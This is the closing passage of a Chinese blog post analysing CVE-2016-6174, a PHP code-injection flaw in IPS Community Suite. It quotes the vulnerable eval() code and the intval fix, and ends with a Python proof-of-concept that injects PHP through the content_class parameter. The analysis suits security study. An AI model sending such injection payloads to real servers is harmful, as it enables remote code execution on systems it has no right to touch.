+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">23</span> ) === <span class="string">'IPS\cms\Records\Comment'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">23</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		$databaseId = mb_substr( $class, <span class="number">23</span> );</div><div class="line">	</div><div class="line">		$data = <span class="string">&lt;&lt;&lt;EOF</span></div><div class="line">		namespace IPS\cms\Records;</div><div class="line">		class Comment<span class="subst">&#123;$databaseId&#125;</span> extends Comment</div><div class="line">		&#123; </div><div class="line">			protected static \$multitons = array();</div><div class="line">			public static \$customDatabaseId = <span class="subst">$databaseId</span>;</div><div class="line">			public static \$itemClass = 'IPS\cms\Records<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			public static \$title     = 'content_record_comments_title_<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">			public static \$reputationType = 'comment_id_<span class="subst">&#123;$databaseId&#125;</span>';</div><div class="line">		&#125;</div><div class="line">EOF;</div><div class="line">		<span class="keyword">eval</span>( $data );</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>如果<code>$class = &quot;IPS\cms\Records\Comment1xxxxxxxx&quot;</code> 则可以进入判断</p>
+<p><img src="http://qn.lazysheep.cc/img/ips_pic2.png" alt="ips_pic2"></p>
+<p>在比如最后一个判断再输出下执行的值:</p>
+<p><img src="http://qn.lazysheep.cc/img/ips_pic3.png" alt="ips_pic3"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>php版本限制的原因是闭合代码的字符, 比如<code>{ } ;</code>这些都属于非法字符, 上面的第二个测试代码有Fuzzing出允许的字符, 如果使用允许的字符能构造出语法正确的命令则可以增加该漏洞的杀伤力, 不过新版本已经使用<code>intval</code>函数对于输入进行过滤了</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//example</span></div><div class="line">if ( mb_substr( $class, <span class="number">0</span>, <span class="number">47</span> ) === 'IPS\cms\extensions\core\EditorLocations\Records' and is_numeric( mb_substr( $class, <span class="number">47</span>, <span class="number">1</span> ) ) )</div><div class="line">	&#123;</div><div class="line">		$databaseId = intval(mb_substr( $class, <span class="number">47</span> ));</div><div class="line">		eval( <span class="string">"namespace IPS<span class="subst">\\</span>cms<span class="subst">\\</span>extensions<span class="subst">\\</span>core<span class="subst">\\</span>EditorLocations; class Records&#123;$databaseId&#125; extends <span class="subst">\\</span>IPS<span class="subst">\\</span>cms<span class="subst">\\</span>extensions<span class="subst">\\</span>core<span class="subst">\\</span>EditorLocations<span class="subst">\\</span>Records &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>带上PoC:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self)</span>:</span></div><div class="line">    result = &#123;&#125;</div><div class="line">    random_string = random.choice(string.ascii_lowercase) + random.choice(string.ascii_uppercase)</div><div class="line">    random_string = hashlib.sha1(random_string).hexdigest()[<span class="number">20</span>:] + <span class="string">"H"</span></div><div class="line">    random_num1 = random.randint(<span class="number">24</span>,<span class="number">46330</span>)</div><div class="line">    random_num2 = random.randint(<span class="number">200</span>,<span class="number">46040</span>)</div><div class="line">    payload = <span class="string">'/index.php?app=core&amp;module=system&amp;controller=content&amp;do=find&amp;content_class=cms\Fields1&#123;&#125;echo %s*%s, "%s";exit;/*'</span> %(random_num1, random_num2, random_string)</div><div class="line">    res = req.get(self.url + payload)        </div><div class="line">    random_string = str(random_num1*random_num2) + random_string</div><div class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> random_string <span class="keyword">in</span> res.content:</div><div class="line">        result = &#123;<span class="string">'VerifyInfo'</span>: &#123;&#125;&#125;</div><div class="line">        result[<span class="string">'VerifyInfo'</span>][<span class="string">'URL'</span>] = self.url</div><div class="line">    <span class="keyword">return</span> self.parse_output(result)</div></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
+        <p><span>发布时间:</span>2016-08-10, 21:02:51</p>
+        <p><span>最后更新:</span>2016-08-10, 21:19:07</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2016/08/10/0x1F/" title="CVE-2016-6174漏洞分析">http://0x48.pw/2016/08/10/0x1F/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0x48.pw/2016/08/10/0x1F/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="//qn.lazysheep.cc/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/08/16/0x20/">
+                    LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/07/14/0x1E/">
+                    三个白帽之火币网2W大挑战
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.</span> <span class="toc-text">总结</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/08/16/0x20/" title="上一篇: LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/07/14/0x1E/" title="下一篇: 三个白帽之火币网2W大挑战">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
